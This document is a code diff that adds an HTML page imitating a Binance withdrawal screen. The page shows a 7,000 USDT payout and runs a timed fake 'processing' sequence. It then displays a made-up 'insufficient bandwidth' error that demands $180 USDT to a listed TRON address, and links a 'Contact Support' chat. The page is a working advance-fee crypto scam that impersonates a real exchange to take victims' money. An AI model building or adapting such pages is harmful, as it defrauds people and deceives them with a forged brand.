@@ -102,4 +102,97 @@
       color: #fff;
     }
     .support-button {
-      position
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: #f3ba2f;
+      color: #0b0f1a;
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contact Support</a>
+
+  <div class="app">
+    <div class="logo">BINANCE</div>
+    <div class="amount">7,000 USDT</div>
+    <div class="network">Network: TRC20</div>
+    <div class="swipe" onclick="showPreview()">→ Swipe to confirm</div>
+
+    <div class="section" id="preview">
+      <h3>Transaction Preview</h3>
+      <div class="label">Receiving Address</div>
+      <div class="value">TSchVxCkHRxS23PZMTsp38R9tjfPBmnxj2</div>
+      <button class="button" onclick="startProcessing()">PROCESS WITHDRAWAL</button>
+    </div>
+
+    <div class="section" id="processing">
+      <p>Please hold on while your payment is being credited to your account...</p>
+      <p id="timer">Loading: 4:00</p>
+    </div>
+
+    <div class="section" id="received">
+      <button class="button" id="receivedBtn" disabled>I HAVE RECEIVED</button>
+    </div>
+
+    <div class="section" id="error">
+      <div class="error">⚠️ WITHDRAWAL ERROR: INSUFFICIENT BANDWIDTH</div>
+      <p class="value">$180 USDT IS REQUIRED FOR BANDWIDTH AND WITHDRAW ALLOCATION CODE</p>
+      <p class="value">Withdrawal will be received in 10 seconds after clearance.</p>
+      <div class="label">Pay Now Address</div>
+      <div class="address-box">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</div>
+      <button class="button">PAY NOW</button>
+    </div>
+  </div>
+
+  <script>
+    function showPreview() {
+      document.getElementById('preview').style.display = 'block';
+    }
+
+    function startProcessing() {
+      document.getElementById('preview').style.display = 'none';
+      document.getElementById('processing').style.display = 'block';
+
+      let time = 240;
+      const timerEl = document.getElementById('timer');
+      const interval = setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        timerEl.textContent = `Loading: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        time--;
+        if (time === 0) {
+          clearInterval(interval);
+          document.getElementById('processing').style.display = 'none';
+          document.getElementById('received').style.display = 'block';
+          enableReceivedButton();
+        }
+      }, 1000);
+    }
+
+    function enableReceivedButton() {
+      let countdown = 60;
+      const btn = document.getElementById('receivedBtn');
+      const interval = setInterval(() => {
+        countdown--;
+        if (countdown === 0) {
+          clearInterval(interval);
+          btn.disabled = false;
+          btn.onclick = showError;
+        }
+      }, 1000);
+    }
+
+    function showError() {
+      document.getElementById('received').style.display = 'none';
+      document.getElementById('error').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
